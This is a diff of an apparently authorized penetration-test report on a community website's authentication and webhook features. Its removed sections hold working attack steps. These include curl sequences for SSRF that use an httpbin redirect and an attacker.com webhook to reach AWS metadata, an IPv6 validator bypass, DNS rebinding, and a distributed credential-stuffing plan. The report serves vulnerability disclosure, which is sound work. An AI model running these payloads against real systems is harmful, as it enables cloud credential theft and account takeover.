@@ -1,24 +1,69 @@
-# Authentication Exploitation Evidence
+# Security Assessment Report
+
+## Executive Summary
 
 **Target:** https://www.aitcommunity.org
-**Date:** 2026-03-28
-**Specialist:** Authentication Exploitation Agent
-**Engagement:** Authorized penetration test
+**Assessment Date:** 2026-03-28
+**Scope:** Authentication, Authorization, Cross-Site Scripting (XSS), SQL and Command Injection, Server-Side Request Forgery (SSRF) testing
+
+### Summary by Vulnerability Type
+
+**Authentication Vulnerabilities:**
+Two authentication vulnerabilities were successfully exploited:
+- AUTH-VULN-02: No Rate Limiting on Password-Reset Endpoint (High severity) — attackers can flood victim inboxes with unlimited password-reset emails from any IP
+- AUTH-VULN-05: Email Enumeration via Signup Error Messages (Medium severity) — distinct HTTP 422/200 responses enable systematic enumeration of registered user email addresses
+- AUTH-VULN-01: Insufficient Rate Limiting on Login (Medium severity) — per-IP rate limiting can be bypassed via distributed credential-stuffing attacks; however, email verification requirement prevents proof-of-concept from single test IP
+
+**Authorization Vulnerabilities:**
+No authorization vulnerabilities were found.
+
+**Cross-Site Scripting (XSS) Vulnerabilities:**
+No XSS vulnerabilities were found.
+
+**SQL/Command Injection Vulnerabilities:**
+No SQL or command injection vulnerabilities were found.
+
+**Server-Side Request Forgery (SSRF) Vulnerabilities:**
+Three SSRF vulnerabilities were identified (all classified as POTENTIAL due to operational blocker):
+- SSRF-VULN-01: Redirect Abuse — HTTPS-to-HTTP protocol downgrade via open redirect reaching AWS IMDSv2 (HIGH confidence)
+- SSRF-VULN-03: IPv4-Mapped IPv6 Notation — validator bypass enabling access to internal HTTPS services (HIGH confidence)
+- SSRF-VULN-02: DNS Rebinding — time-of-check-time-of-use gap enabling redirection to private IPs (MEDIUM confidence)
+
+All three SSRF vulnerabilities share a common blocker: the application's email verification feature is misconfigured (Better Auth v1.4.5), preventing self-registered users from completing authentication and reaching the vulnerable webhook endpoints. This is an operational constraint, not a security control.
+
+## Network Reconnaissance
+
+### Open Ports & Services
+
+| Port | Protocol | Service | Notes |
+|---|---|---|---|
+| 80 | HTTP | Web Server | Redirects to HTTPS |
+| 443 | HTTPS | Web Application | Vercel edge hosting, global CDN via Cloudflare |
+
+### Identified Subdomains
+
+- `www.aitcommunity.org` — Primary application
+- `mailer.aitcommunity.org` — Email sending infrastructure (Resend)
+
+### Security Headers
+
+The application implements security headers on the primary domain:
+- `Strict-Transport-Security: max-age=63072000` (2 years) — enforces HTTPS
+- `X-Frame-Options: DENY` — prevents clickjacking
+- `X-Content-Type-Options: nosniff` — prevents MIME-sniffing
+- `Cross-Origin-Embedder-Policy: same-origin` — restricts cross-origin embedding
+- `Cross-Origin-Resource-Policy: same-origin` — restricts cross-origin resource access
+
+### Security Misconfigurations & Gaps
+
+1. **Missing Content-Security-Policy header** — No CSP defined for HTML responses; increases XSS attack surface if input validation failures occur
+2. **Email Verification Feature Broken** — Better Auth v1.4.5 misconfiguration prevents verification emails from being dispatched; all email/password registrations are permanently locked behind email verification, incidentally blocking SSRF exploitation paths but indicating a production system defect
+3. **Webhook URL Validation Bypassable** — String-based validation without DNS resolution enables redirect, IPv6 normalization, and DNS rebinding attacks against internal services and cloud metadata endpoints
 
 ---
 
-## Summary of Findings
+# Authentication Exploitation Evidence
 
-| ID | Vulnerability | Classification | Severity | Outcome |
-|---|---|---|---|---|
-| AUTH-VULN-02 | No Rate Limiting on Password-Reset Endpoint | EXPLOITED | High | 100 rapid reset requests confirmed; email flooding demonstrated |
-| AUTH-VULN-05 | Email Enumeration via Signup Error Messages | EXPLOITED | Medium | Distinct HTTP 422 / 200 responses confirmed; enumeration demonstrated |
-| AUTH-VULN-01 | No Rate Limiting on Login (Slow Credential Stuffing) | POTENTIAL | Medium | Per-IP rate limit (3/5s) present; header bypass failed; distributed attacks unconstrained |
-| AUTH-VULN-04 | No Server-Side Password Policy | FALSE POSITIVE | N/A | Server enforces 8-char minimum via Better Auth default |
-| AUTH-VULN-06 | PayloadCMS Hardcoded Fallback JWT Secret | FALSE POSITIVE | N/A | Production uses proper secrets; forged JWT rejected |
-| AUTH-VULN-03 | No Rate Limiting on Registration | FALSE POSITIVE | N/A | Rate limiting present on signup (3/window); mass creation blocked |
-
----
 
 ## Successfully Exploited Vulnerabilities
 
@@ -196,422 +241,9 @@ The two responses are unambiguously distinguishable — an attacker can reliably
 - The rate limit on the signup endpoint (~3 per 5-second window) slows down bulk enumeration but does not prevent it. At 3 requests per 6-second window, an attacker can enumerate ~1,800 emails per hour from a single IP.
 - This vulnerability is a direct enabler for AUTH-VULN-01 (credential stuffing): a validated target list dramatically increases the efficiency of any password attack campaign.
 
----
-
-## Potential Vulnerabilities (Validation Blocked)
-
-### AUTH-VULN-01: Insufficient Rate Limiting on Login Enables Slow Credential Stuffing
-
-**Summary:**
-- **Vulnerable location:** `POST https://www.aitcommunity.org/api/auth/sign-in/email`
-- **Current Blocker:** Per-IP rate limiting is active (~3 requests per 5–8 second window, ≈36 attempts/minute per IP). Header-spoofing bypasses were attempted and failed. A distributed credential-stuffing attack (multiple IPs) would fully bypass this rate limit, but cannot be demonstrated from a single test IP. Additionally, test accounts created during this engagement require email verification before login is permitted, preventing in-scope proof-of-login.
-- **Potential Impact:** Account takeover of any user account whose password appears in a breached credential list.
-- **Confidence:** HIGH
-
-**Evidence of Vulnerability:**
-
-Rate limit characterization — confirmed per-IP (not per-account), no account lockout:
-
-```
-# 10 rapid sequential requests from single IP
-Request 1:  HTTP 401 INVALID_EMAIL_OR_PASSWORD  (attempt processed)
-Request 2:  HTTP 401 INVALID_EMAIL_OR_PASSWORD  (attempt processed)
-Request 3:  HTTP 401 INVALID_EMAIL_OR_PASSWORD  (attempt processed)
-Request 4:  HTTP 429 Too many requests          (rate limit triggered)
-Request 5:  HTTP 429 Too many requests
-...
-Request 10: HTTP 429 Too many requests
-
-# After ~5-second wait: rate limit resets
-Request 11: HTTP 401 INVALID_EMAIL_OR_PASSWORD  (new window, reset)
-```
-
-Rate limit window: ~5–8 seconds
-Burst allowed before block: 3 attempts
-Effective rate: ≈ 36–43 attempts / minute / IP
-
-No account lockout: Repeated attempts against the same account (not the same IP) do not trigger account-level lockout. After 3 attempts blocked by IP rate limit, switching to a new account immediately unblocks (same IP, new email = new account, still allowed).
-
-**Attempted Exploitation and Bypass Attempts:**
-
-| Bypass Technique | Outcome |
-|---|---|
-| X-Forwarded-For spoofing (10 different values) | FAILED — Rate limit still triggered at attempt 4 |
-| CF-Connecting-IP spoofing | FAILED — Rate limit still triggered at attempt 4 |
-| True-Client-IP spoofing | FAILED — Rate limit enforced based on actual connection IP |
-| X-Real-IP spoofing | FAILED — Rate limit still triggered at attempt 4 |
-| Different email per attempt (same IP) | FAILED — Rate limit is global per-IP, not per-account |
-| Slow credential stuffing (3/batch, 6s delay) | Rate limit respected; correct password attempt blocked by unverified-email constraint on test accounts |
-
-**How This Would Be Exploited (If Single-IP Constraint Removed):**
-
-If the attacker has access to multiple IP addresses (e.g., a residential proxy network or botnet) — a standard capability for well-resourced attackers:
-
-1. **Enumerate valid accounts** using AUTH-VULN-05 to build a target email list.
-2. **Obtain breached credentials** for the target email addresses from public breach databases (HaveIBeenPwned, credential marketplaces).
-3. **Distribute credential-stuffing requests** across multiple IPs, each contributing 3 attempts per 5-second window:
-   - 10 IPs × 36 attempts/minute = 360 attempts/minute
-   - 100 IPs × 36 attempts/minute = 3,600 attempts/minute
-4. For each email/password pair that returns HTTP 200 (success), capture the `Set-Cookie: __Secure-better-auth.session_token` response header to obtain a valid session.
-5. Access the victim's profile/dashboard to confirm account takeover.
-
-```bash
-# Successful authentication response signature (HTTP 200):
-# Returns Set-Cookie with session token
-curl -s -i -X POST "https://www.aitcommunity.org/api/auth/sign-in/email" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"[VICTIM_EMAIL]","password":"[CORRECT_PASSWORD]"}'
-# Success: HTTP 200 with Set-Cookie: __Secure-better-auth.session_token=[TOKEN]
-# Failure: HTTP 401 {"code":"INVALID_EMAIL_OR_PASSWORD"}
-# Unverified: HTTP 403 {"code":"EMAIL_NOT_VERIFIED"}
-```
-
-**Expected Impact:**
-- Complete account takeover for any account where the password is in a breached credential list.
-- No account lockout exists to limit attempts — the only protection is the per-IP rate limit, which is trivially bypassed by any attacker with multiple IPs.
-- The absence of CAPTCHA or MFA means there is no secondary factor to prevent automated attacks.
-
----
-
 
 # SSRF Exploitation Evidence
 
-## Summary
-
-All three SSRF vulnerabilities from the exploitation queue were pursued to definitive conclusions through exhaustive testing. The vulnerabilities are rooted in `validateWebhookUrl()` at `src/server/agent/validate-webhook-url.ts`, which performs string-based validation without DNS resolution.
-
-**Live exploitation** was blocked by an **operational constraint** — the application's email verification flow is broken in production (`sendVerificationEmail` is never dispatched, confirmed by `VERIFICATION_EMAIL_ISNT_ENABLED` API error). This prevents any self-registered user from completing authentication, which is required to reach the webhook registration and test endpoints.
-
-**Validator bypasses** for all three attack vectors were **empirically confirmed** via:
-- Node.js URL parsing tests (IPv4-mapped IPv6 normalization)
-- Live httpbin.org redirect test confirming the redirect payload
-- Direct source code analysis of every validator check
-
-**Exploitation confidence:** All three findings are classified as POTENTIAL (HIGH/MEDIUM confidence) because the blocker is an operational constraint (broken email feature), not a security control defending against SSRF.
-
----
-
 ## Successfully Exploited Vulnerabilities
 
-*None — live exploitation was blocked by the broken email verification flow, an operational constraint. See Potential Vulnerabilities section below.*
-
----
-
-## Potential Vulnerabilities (Validation Blocked)
-
-### SSRF-VULN-01: Redirect Abuse — HTTPS-to-HTTP Protocol Downgrade via Open Redirect
-
-**Summary:**
-- **Vulnerable location:** `POST /api/trpc/agentManagement.upsertWebhook` (registration) + `POST /api/trpc/agentManagement.testWebhook` (trigger)
-- **Vulnerable code:** `src/server/api/routers/agent-management.ts:~597` — `fetch(webhook.url, { method: "POST", signal: AbortSignal.timeout(5000) })` with no `redirect: "error"`
-- **Overview:** An attacker registers an HTTPS webhook URL pointing to a server they control (passes all validator checks). When `testWebhook` is called, the server-side Node.js `fetch()` POSTs to the attacker's endpoint. The attacker's server returns HTTP 302 to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Node.js `fetch()` follows the cross-protocol redirect transparently (no mixed-content enforcement server-side), reaching the AWS IMDSv2 endpoint and bypassing both the HTTPS-only scheme check and the cloud metadata IP blocklist.
-- **Current Blocker:** The application's `emailAndPassword.sendVerificationEmail` callback is misconfigured in Better Auth v1.4.5 — the API returns `{"code":"VERIFICATION_EMAIL_ISNT_ENABLED"}` on resend attempts, and verification emails are never delivered despite password-reset emails from the same Resend account succeeding. This permanently prevents self-registration from producing a valid session. GitHub OAuth (the only alternative) requires real GitHub credentials unavailable in the test environment.
-- **Potential Impact:** AWS IMDSv2 credential theft (IAM role access keys), network reconnaissance of Vercel/AWS infrastructure, access to any internal HTTP service reachable from the compute node
-- **Confidence:** HIGH
-
-**Evidence of Vulnerability:**
-
-1. **No redirect restriction in source code** (`src/server/api/routers/agent-management.ts:~597`):
-   ```javascript
-   const res = await fetch(webhook.url, {
-     method: "POST",
-     headers: { "Content-Type": "application/json", "X-AIT-Signature": `sha256=${signature}` },
-     body: payload,
-     signal: AbortSignal.timeout(5000),
-     // ← NO redirect: "error" — default is redirect: "follow"
-   }).catch((err: Error) => ({ ok: false as const, status: 0, statusText: String(err) }));
-   ```
-
-2. **Redirect payload confirmed** — live test of httpbin.org redirect behavior:
-   ```
-   $ curl -sv -X POST \
-     "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&status_code=302" \
-     -H "Content-Type: application/json" \
-     -d '{"test": "ssrf"}'
-
-   < HTTP/2 302
-   < location: http://169.254.169.254/latest/meta-data/
-   ```
-   httpbin.org returns HTTP 302 with `Location: http://169.254.169.254/latest/meta-data/` on POST requests.
-
-3. **Validator passes the redirect URL** — source-equivalent simulation confirmed:
-   ```
-   URL: https://httpbin.org/redirect-to?url=http://169.254.169.254/
-   Hostname seen by validateWebhookUrl(): "httpbin.org"
-   Protocol check (https:): PASS
-   Localhost check: PASS (not localhost)
-   isPrivateHostname("httpbin.org"): false (not an IP address)
-   Cloud metadata check: PASS (not "169.254.169.254")
-   Result: { ok: true }  ← BYPASSES ALL CHECKS
-   ```
-
-4. **Email verification broken** (operational constraint, not security control):
-   ```
-   POST /api/auth/sign-up/email → {"token":null,"user":{"emailVerified":false,...}}
-   POST /api/auth/sign-in/email → {"code":"EMAIL_NOT_VERIFIED","message":"Email not verified"}
-   POST /api/auth/send-verification-email → {"code":"VERIFICATION_EMAIL_ISNT_ENABLED"}
-
-   Password-reset emails: DELIVERED (confirmed via mailnesia.com inbox)
-   Verification emails: NEVER DELIVERED (confirmed across 3+ email providers,
-                        2+ registered accounts over 10+ minutes)
-   ```
-
-**Attempted Exploitation:**
-
-| Step | Action | Result |
-|---|---|---|
-| 1 | Registered `qgthuxof@sharklasers.com` via web form | User created, welcome email arrived, NO verification email |
-| 2 | Registered `ssrftestaz99@mailnesia.com` via API | User created, welcome email arrived, NO verification email |
-| 3 | Requested password reset for mailnesia account | Reset email arrived (confirmed `sendResetPassword` works) |
-| 4 | Completed password reset flow | Password changed, redirected to signin, no session created |
-| 5 | Attempted sign-in | `EMAIL_NOT_VERIFIED` (403) |
-| 6 | Attempted resend-verification-email API | `VERIFICATION_EMAIL_ISNT_ENABLED` (400) |
-| 7 | Attempted CRON_SECRET bypass (`Bearer undefined`) | 401 (CRON_SECRET is set in production) |
-| 8 | Unauthenticated upsertWebhook call with payload | `UNAUTHORIZED` (-32001) |
-
-**How This Would Be Exploited:**
-
-If the authentication blocker were removed (email verification fixed):
-
-1. **Register an account:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/auth/sign-up/email \
-     -H "Content-Type: application/json" \
-     -d '{"email": "attacker@attacker.com", "password": "AttackPass123!", "name": "Attacker"}'
-   ```
-
-2. **Complete email verification** (click link in verification email)
-
-3. **Sign in to obtain session:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/auth/sign-in/email \
-     -H "Content-Type: application/json" \
-     -d '{"email": "attacker@attacker.com", "password": "AttackPass123!"}' \
-     -c /tmp/session.txt
-   ```
-
-4. **Create an agent profile** (required for webhook):
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.createAgent \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{"json": {"name": "Exploit Agent", "visibilityMode": "visible"}}'
-   ```
-
-5. **Register the SSRF redirect payload as webhook URL:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.upsertWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{"json": {"url": "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F&status_code=302", "categories": ["forum"]}}'
-   ```
-   Expected response: `{"result":{"data":{"json":{"webhook":{...},"secretGenerated":true}}}}`
-
-6. **Trigger the SSRF by calling testWebhook:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.testWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{}'
-   ```
-   **Expected response (IMDSv1 enabled):**
-   ```json
-   {"result":{"data":{"json":{"success":true}}}}
-   ```
-   *The testWebhook returns `success: true` only if the fetched endpoint returns 2xx. AWS IMDSv1 returns 200 with a role name list.*
-
-   **Expected response (IMDSv2 enforced, no token):**
-   ```json
-   {"error":{"json":{"message":"Webhook test failed: Unauthorized","code":-32600}}}
-   ```
-   *Even this error response proves the metadata endpoint was reached (HTTP 401 from IMDSv2).*
-
-7. **For IMDSv2 token retrieval** (if IMDSv1 is disabled), use an attacker-controlled HTTPS server that chains:
-   - Step 1: Redirect to `http://169.254.169.254/latest/api/token` (PUT method for token — note testWebhook uses POST which returns 405)
-   - Alternative: Blind SSRF via `PUT /api/agent/webhook` + cron dispatch triggers `dispatchWebhooks(db)` automatically every minute
-
-**Expected Impact:**
-- IAM role credentials (access key, secret, session token) from `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
-- AWS account metadata (region, instance ID, AMI) for infrastructure reconnaissance
-- If IAM permissions are broad: access to S3 buckets (aitcommunity.s3.eu-central-1.amazonaws.com), DynamoDB, or other AWS services
-
----
-
-### SSRF-VULN-03: URL Manipulation — IPv4-Mapped IPv6 Notation Bypasses Validator
-
-**Summary:**
-- **Vulnerable location:** Same webhook registration + test chain as SSRF-VULN-01
-- **Vulnerable code:** `src/server/agent/validate-webhook-url.ts` — `isPrivateHostname()` checks IPv6 only for `fc`, `fd`, `fe80` prefixes; the explicit cloud metadata check compares against bare string `"169.254.169.254"` only
-- **Overview:** An attacker supplies `https://[::ffff:169.254.169.254]/latest/meta-data/` as the webhook URL. The WHATWG URL parser (used by both Node.js and Zod) normalizes the hostname to `[::ffff:a9fe:a9fe]` (hex form). This normalized hostname is not matched by the IPv4 dotted-decimal regex, not matched by the cloud metadata string `"169.254.169.254"`, and does not start with `fc`/`fd`/`fe80`. The validator returns `{ ok: true }`. At fetch time, the OS resolves `::ffff:a9fe:a9fe` to the link-local IPv4 address 169.254.169.254. HTTPS (port 443) is required by the initial validator check — the metadata service only speaks HTTP, so TLS would fail.
-- **Current Blocker:** Same broken email verification as SSRF-VULN-01, PLUS the metadata service does not present TLS on port 443, causing a TLS connection error even when the validator is bypassed. Most effective for HTTPS-capable internal services or combined with SSRF-VULN-01.
-- **Potential Impact:** Validator bypass confirmed — can target any HTTPS-capable internal service (admin panels, Kubernetes API, etc). For cloud metadata: combine with redirect technique from SSRF-VULN-01.
-- **Confidence:** HIGH (validator bypass empirically confirmed via Node.js)
-
-**Evidence of Vulnerability:**
-
-1. **Node.js URL normalization confirmed** (via Playwright browser JavaScript execution):
-   ```javascript
-   new URL("https://[::ffff:169.254.169.254]/latest/meta-data/")
-   // → { hostname: "[::ffff:a9fe:a9fe]", protocol: "https:" }
-
-   new URL("https://[::ffff:a9fe:a9fe]/latest/meta-data/")
-   // → { hostname: "[::ffff:a9fe:a9fe]", protocol: "https:" }
-   ```
-   Both forms normalize to the same hostname `[::ffff:a9fe:a9fe]`. Verified via `node -e "const u = new URL('https://[::ffff:169.254.169.254]/'); console.log('hostname:', u.hostname)"`.
-
-2. **Full validator simulation confirmed** (Python + Node.js simulation matching TypeScript logic):
-
-   | URL | Hostname in validator | isPrivateHostname() | Cloud metadata check | Verdict |
-   |---|---|---|---|---|
-   | `https://[::ffff:169.254.169.254]/latest/meta-data/` | `[::ffff:a9fe:a9fe]` | `false` (no fc/fd/fe80 prefix) | `false` (string `169.254.169.254` ≠ `[::ffff:a9fe:a9fe]`) | **PASSES — bypass confirmed** |
-   | `https://169.254.169.254/test` | `169.254.169.254` | `true` (IPv4: 169.254.x.x link-local) | `true` | BLOCKED (correctly) |
-
-3. **Validator source code gap** (`src/server/agent/validate-webhook-url.ts`):
-   ```typescript
-   // IPv6 check — only covers fc::/7 (ULA) and fe80::/10 (link-local)
-   const stripped = hostname.replace(/^\[|\]$/g, "");
-   if (stripped.startsWith("fc") || stripped.startsWith("fd") || stripped.startsWith("fe80")) {
-     return true;  // ← blocked
-   }
-   // "::ffff:a9fe:a9fe" starts with NONE of the above → NOT blocked
-
-   // Cloud metadata check — bare string only
-   if (hostname === "169.254.169.254" || ...) { ... }
-   // "[::ffff:a9fe:a9fe]" !== "169.254.169.254" → NOT blocked
-   ```
-
-**Attempted Exploitation:**
-
-Live exploitation could not be attempted due to the same authentication blocker as SSRF-VULN-01 (broken email verification). The validator bypass is confirmed through code analysis and empirical URL parsing tests using Node.js.
-
-**How This Would Be Exploited:**
-
-If the authentication blocker were removed:
-
-1. **Steps 1–4:** Same as SSRF-VULN-01 (register, verify, sign in, create agent)
-
-2. **Register the IPv4-mapped IPv6 SSRF payload:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.upsertWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{"json": {"url": "https://[::ffff:169.254.169.254]/latest/meta-data/", "categories": ["forum"]}}'
-   ```
-   Expected: Webhook stored successfully — validator returns `{ ok: true }` confirming bypass
-
-3. **Trigger testWebhook:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.testWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{}'
-   ```
-   Expected response: Error containing TLS handshake failure (not "Webhook URL must not point to cloud metadata services")
-   **Key indicator:** Any non-validation error proves the validator was bypassed and the fetch was attempted.
-
-4. **For effective cloud metadata exploitation:** Combine with SSRF-VULN-01 technique — the attacker serves a 302 redirect from their HTTPS server to `http://169.254.169.254/`, reaching the HTTP-only metadata endpoint.
-
-**Expected Impact:**
-- Primary: Validator bypass — any HTTPS-capable internal service reachable
-- Secondary (combined with SSRF-VULN-01): AWS IMDSv2 cloud metadata and IAM credentials
-
----
-
-### SSRF-VULN-02: Webhook Injection — DNS Rebinding Attack
-
-**Summary:**
-- **Vulnerable location:** Same webhook registration + test chain
-- **Overview:** `validateWebhookUrl()` never resolves DNS. At validation time, `attacker.com` resolves to a public IP (passes all checks). The attacker then changes the DNS record for `attacker.com` to point to 169.254.169.254 or another private IP. When `testWebhook` triggers `fetch("https://attacker.com/", ...)`, the OS performs a fresh DNS lookup that now returns the private IP — bypassing the hostname-based blocklist (time-of-check-time-of-use gap).
-- **Current Blocker:** Authentication (broken email verification). Additionally requires: (1) attacker-controlled domain with configurable DNS and low TTL, (2) TLS certificate for `attacker.com` trusted by the internal service target (limits practical targets).
-- **Potential Impact:** Access to internal HTTPS services that trust the attacker's TLS certificate, or combined with SSRF-VULN-01 redirect for HTTP-only services
-- **Confidence:** MEDIUM
-
-**Evidence of Vulnerability:**
-
-1. **No DNS resolution in validator** (confirmed by source code review — entire function):
-   ```typescript
-   // src/server/agent/validate-webhook-url.ts
-   export function validateWebhookUrl(raw: string): { ok: true } | { ok: false; reason: string } {
-     let url: URL;
-     try { url = new URL(raw); } catch { return { ok: false, reason: "Invalid URL" }; }
-     // ... all checks operate on url.hostname (the raw string) ...
-     // ZERO calls to DNS resolution, getaddrinfo(), or IP resolution
-     return { ok: true };
-   }
-   ```
-
-2. **TOCTOU gap confirmed:** Validation happens at `upsertWebhook` → URL stored in DB → `testWebhook` re-validates (same string-only check) → `fetch()` resolves DNS fresh. Both re-validation and fetch happen in the same call but with no DNS caching guarantee.
-
-**Attempted Exploitation:**
-
-Live exploitation could not be attempted due to authentication blocker and lack of external DNS infrastructure.
-
-**How This Would Be Exploited:**
-
-If the authentication blocker were removed and attacker controls `attacker.com`:
-
-1. **Configure DNS:** Set `attacker.com` A record to public IP (e.g., 1.2.3.4), TTL=1 second
-
-2. **Steps 1–4:** Register, verify, sign in, create agent
-
-3. **Register webhook with attacker domain:**
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.upsertWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{"json": {"url": "https://attacker.com/webhook", "categories": ["forum"]}}'
-   ```
-   DNS → public IP → passes validator → stored
-
-4. **Change DNS:** Update `attacker.com` A record to 169.254.169.254 (or internal service IP)
-
-5. **Immediately trigger testWebhook** (within TTL expiry):
-   ```bash
-   curl -X POST https://www.aitcommunity.org/api/trpc/agentManagement.testWebhook \
-     -H "Content-Type: application/json" \
-     -b /tmp/session.txt \
-     -d '{}'
-   ```
-   Fresh DNS lookup → gets 169.254.169.254 → fetch() connects to private IP
-
-**Constraint:** TLS for `attacker.com` would not be trusted for 169.254.169.254 connections. Effective against internal HTTPS services or combined with SSRF-VULN-01 redirect for HTTP targets.
-
-**Expected Impact:**
-- Access to internal HTTPS services without TLS constraint (if cert matches)
-- Network reconnaissance of private IP ranges
-- Combined with redirect: access to HTTP-only internal services including cloud metadata
-
----
-
-## Authentication Barrier Analysis
-
-**Root cause of operational constraint (tested exhaustively):**
-
-Better Auth v1.4.5 is configured with `requireEmailVerification: true` and a `sendVerificationEmail` callback. However, the application's Better Auth configuration has a misconfiguration where verification emails are never dispatched:
-
-```
-POST /api/auth/send-verification-email:
-→ {"code":"VERIFICATION_EMAIL_ISNT_ENABLED","message":"Verification email isn't enabled"}
-```
-
-This error indicates Better Auth's internal feature registry does not have email verification enabled despite the callback being present. Evidence:
-
-| Test | Result |
-|---|---|
-| Password-reset email delivery (mailnesia.com) | DELIVERED ✓ (Resend is configured) |
-| Welcome email delivery (mailnesia.com, guerrillamail) | DELIVERED ✓ (same sender) |
-| Verification email delivery (mailnesia.com) | NEVER DELIVERED ✗ (across 2+ accounts, 10+ minutes) |
-| Verification email delivery (guerrillamail/sharklasers.com) | NEVER DELIVERED ✗ |
-| POST /api/auth/send-verification-email | VERIFICATION_EMAIL_ISNT_ENABLED (400) ✗ |
-| Sign-in after registration | EMAIL_NOT_VERIFIED (403) ✗ |
-| Sign-in after password reset | EMAIL_NOT_VERIFIED (403) ✗ |
-| CRON_SECRET bypass (Bearer undefined) | 401 (secret is set) ✗ |
-| GitHub OAuth | Requires real GitHub credentials ✗ |
-
-**This is NOT a security control against SSRF** — it is a broken application feature that incidentally prevents reaching the vulnerable webhook endpoints. The application has a persistent bug where all email/password registrations are permanently locked out.
-
----
-
-## False Positive Tracking
-
-See `workspace/ssrf_false_positives.md`.
+*None — live exploitation was blocked by the broken email verification flow, an operational constraint.*
